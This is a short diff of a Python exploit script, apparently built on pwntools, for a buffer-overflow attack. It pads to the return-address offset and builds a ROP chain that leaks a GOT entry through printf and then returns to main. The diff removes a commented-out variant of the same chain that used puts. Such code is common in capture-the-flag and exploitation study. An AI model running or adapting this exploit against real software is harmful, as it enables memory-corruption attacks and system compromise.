@@ -27,16 +27,6 @@ def exploit(binary: str):
 
     padding = cyclic(detection.find_rip_offset(binary))
     payload += padding
-    #print(e.got)
-    '''
-    if 'puts' in e.got:
-        payload += p64(rop.ret.address)
-        rop.puts(e.got['puts'])
-        payload += rop.chain()
-        payload += p64(rop.ret.address)
-        payload += p64(e.sym['main'])
-        selected = 'puts'
-    ''' 
         
     if 'printf' in e.got:
         payload += p64(rop.ret.address)
